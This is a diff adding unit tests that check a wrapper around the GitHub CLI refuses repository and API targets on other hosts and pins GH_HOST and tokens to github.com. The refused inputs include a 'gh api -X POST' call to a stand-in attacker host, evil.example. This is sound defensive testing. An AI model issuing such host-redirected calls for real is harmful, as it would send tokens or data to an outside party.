@@ -105,3 +105,36 @@ class ExecTest(unittest.TestCase):
             code, m = run_exec(argv)
             self.assertEqual(code, 64, argv)
             m.assert_not_called()
+
+
+class ExecHostPinTest(ExecTest):  # inherits tier1() helper
+    def test_other_hosts_refused(self):
+        identity.use(lambda: None)
+        base = ["gh", "issue", "comment", "5", "--body", "x"]
+        for extra in (["-R", "evil.example/o/r"], ["-R=o/r"], ["--repo=h/o/r"], ["--repo", "h/o/r"],
+                      ["-Revil.example/o/r"], ["-R"], ["--repo=o"]):
+            code, m = run_exec(base + extra)
+            self.assertEqual(code, 64, extra)
+            m.assert_not_called()
+        code, m = run_exec(["gh", "api", "-X", "POST", "https://evil.example/x", "-f", "a=b"])
+        self.assertEqual(code, 64)
+        m.assert_not_called()
+
+    def test_owner_repo_still_runs(self):
+        identity.use(lambda: None)
+        for extra in (["-R", "o/r"], ["--repo=o/r"], ["-Ro/r"]):
+            code, m = run_exec(["gh", "issue", "comment", "5", "--body", "x"] + extra)
+            self.assertEqual(code, 0, extra)
+
+    def test_tier1_env_pinned(self):
+        self.tier1()
+        with mock.patch.dict(os.environ, {"GH_HOST": "other", "GH_ENTERPRISE_TOKEN": "x",
+                                          "GITHUB_ENTERPRISE_TOKEN": "y"}):
+            code, m = run_exec(["gh", "issue", "comment", "5", "--body", "x"])
+            env = m.call_args[1]["env"]
+            self.assertEqual(os.environ["GH_HOST"], "other")
+            self.assertEqual(os.environ["GH_ENTERPRISE_TOKEN"], "x")
+        self.assertEqual(env["GH_HOST"], "github.com")
+        self.assertNotIn("GH_ENTERPRISE_TOKEN", env)
+        self.assertNotIn("GITHUB_ENTERPRISE_TOKEN", env)
+        self.assertEqual(env["GH_TOKEN"], "tok-baton")
